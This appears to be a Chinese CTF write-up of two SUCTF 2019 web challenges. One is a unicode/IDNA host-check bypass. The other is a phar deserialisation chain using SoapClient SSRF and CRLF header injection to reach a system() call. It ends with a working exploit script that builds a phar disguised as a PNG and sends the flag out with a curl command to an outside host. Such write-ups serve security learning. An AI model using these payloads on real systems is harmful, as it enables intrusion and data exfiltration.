+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure>
+
+<p>这个题目进行了多次对host的检测，当时着急坐火车没太看..其实就是我之前看过的blackhat提出的一个unicode安全问题，还是先分析一下代码逻辑</p>
+<p>分别用urlparse与urllib对host进行检测，最后把host分开，每个单词先进行idna编码再进行utf-8解码，形成新的host，最后再进行urlparse然后这时的host如果等于suctf.cc那么就会进行urlopen。其实这里的先编码再解码也给的太明显了…..，看这个就可以想到这个unicode安全问题，用脚本跑一下跑出可用的unicode字符，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_true_unicode</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65537</span>):</span><br><span class="line">                a=chr(i)</span><br><span class="line">                url1=<span class="string">"http://suctf.c&#123;&#125;/test.txt"</span>.format(a)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> get_true_url(url1) == <span class="literal">True</span>:</span><br><span class="line">                        print(a)</span><br><span class="line">                        print(<span class="string">"\\x"</span>+hex(i)[<span class="number">2</span>:])</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_true_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">get_true_unicode()</span><br></pre></td></tr></table></figure>
+
+<p>跑出如下字符</p>
+<p><img src="https://s2.ax1x.com/2019/08/26/mfWb28.png" alt="mfWb28.png"></p>
+<p>随便找一个看起来好看一些的字符，这里suctf.cc应该是和localhost进行了绑定，读一下nginx配置文件</p>
+<p><img src="https://s2.ax1x.com/2019/08/26/mfhR7d.png" alt="mfhR7d.png"></p>
+<p>这里在配置文件用alias指定了flag资源的真实请求位置为/usr/fffffflag,访问这个位置即可拿到flag</p>
+<p><a href="https://imgchr.com/i/mf4iB4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/26/mf4iB4.png" alt="mf4iB4.png"></a></p>
+<h3 id="Upload-labs-2"><a href="#Upload-labs-2" class="headerlink" title="Upload labs 2"></a>Upload labs 2</h3><p>题目有两个功能，第一个是传文件，第二个是提交传文件后给你的路径可以得到文件的类型，是一个源码审计的题目，下面就来看一看</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"></span><br><span class="line">$userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    <span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">    $allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $file_name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $temp = explode(<span class="string">"."</span>, $file_name);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    <span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">        &amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">        &amp;&amp; in_array($extension, $allowedExts)</span><br><span class="line">    ) &#123;</span><br><span class="line">        $c = <span class="keyword">new</span> Check($tmp_name);</span><br><span class="line">        $c-&gt;check();</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($tmp_name, $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>限制很严格，应该不存在绕过的方法，分别对Content-Type和后缀名进行了检测，并且后缀名是白名单，不太可能突破，接着看一下其他地方的代码</p>
+<p>第二个功能是查看自己文件的type，代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"url"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里限制了输入文件路径的开头，其实这里去看正则的内容，并不难想到phar反序列化，不过这里也放了一个绕过，形式如<code>phar://filter/resource=phar://test.phar</code></p>
+<p>这里调用了getMIME函数，再来审计一下包括这个函数的整个File类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $file_name;</span><br><span class="line"><span class="keyword">public</span> $type;</span><br><span class="line"><span class="keyword">public</span> $func = <span class="string">"Check"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">    $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name); </span><br><span class="line">    $a-&gt;check();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    finfo_close($finfo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $file_name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos($data, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里调用finfo_open去检测传入文件名的type，这个函数是会调用底层函数<code>php_stream_open_wrapper</code>，所以会触发phar反序列化。很明显这个__wakeup函数是存在问题的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">    $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name); </span><br><span class="line">    $a-&gt;check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>___wakeup魔术方法会在反序列化后调用，利用反射类反射出一个新的类，并且传参初始化，再去调用check如何，看起来非常符合下面的check类，但是如果我们可以自行控制$this-&gt;func，再去调用$this-&gt;filename进行初始化，最后调用check函数，这样就可以想到SoapClient调用不存在方法触发call魔术方法造成SSRF，说到触发这个SSRF，这样就会与admin.php产生联系了,（比赛没来得及打，用的是buuoj的复现，这里admin.php的代码不太一样，不过思路都是一个思路。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> $instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br><span class="line">        $cmd = $_POST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">'clazz'</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">'func1'</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">'func2'</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">'func3'</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">'arg1'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg2'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg3'</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You r not admin!"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里如果是127.0.0.1才会调用Ad类，最终当对象销毁后再调用destruct去执行system，达到命令执行的目录。</p>
+<p>仔细来分析一下这个check方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>逻辑的意思就是调用反射类执行出所传类的三种函数，并且这个check函数是一定要bypass是，不然会因为类和对应的方法不对应产生Fatal error报错导致程序终止，不能再对象销毁后调用destruct，使得无法进行命令执行，这里的类可以通过fuzz来找到这种类，例如SplStack ArrayIterator类分别对应的push和append方法。</p>
+<p>所以最后的pop链大概的构造思路就是通过finfo_open触发phar反序列化进而调用__wakeup魔术方法，通过实例化SoapClient类，并且通过filename变量进行初始化，调用check这个不存在的方法，触发ssrf，带着参数访问admin.php，通过调用SplStack类中的push方法来bypass check函数，最终成功调用destruct魔术方法，进行命令执行,exp如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $file_name;</span><br><span class="line"><span class="keyword">public</span> $type;</span><br><span class="line"><span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">    $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    $a-&gt;check();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $target = <span class="string">'http://127.0.0.1/admin.php'</span>;</span><br><span class="line">    $post_string = <span class="string">'admin=1&amp;cmd=curl http://7d6c515535a2/`/readflag`&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">$this</span>-&gt;file_name = [<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">"location"</span> =&gt; $target,<span class="string">"user_agent"</span>=&gt;<span class="string">"exp\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: profile=1"</span>.<span class="string">"\r\nContent-Length: "</span>.(string)strlen($post_string).<span class="string">"\r\n\r\n"</span>.$post_string,<span class="string">"uri"</span> =&gt; <span class="string">"http://127.0.0.1/"</span>)];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@file_put_contents(<span class="string">"test.txt"</span>,<span class="string">"test"</span>);</span><br><span class="line">$exp=<span class="keyword">new</span> File();</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;script language="php"&gt;__HALT_COMPILER();&lt;/script&gt;'</span>);</span><br><span class="line">$phar-&gt;setMetadata($exp); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">"phar.phar"</span>,<span class="string">"phar.png"</span>);</span><br><span class="line">@unlink(<span class="string">"test.txt"</span>);</span><br></pre></td></tr></table></figure>
+
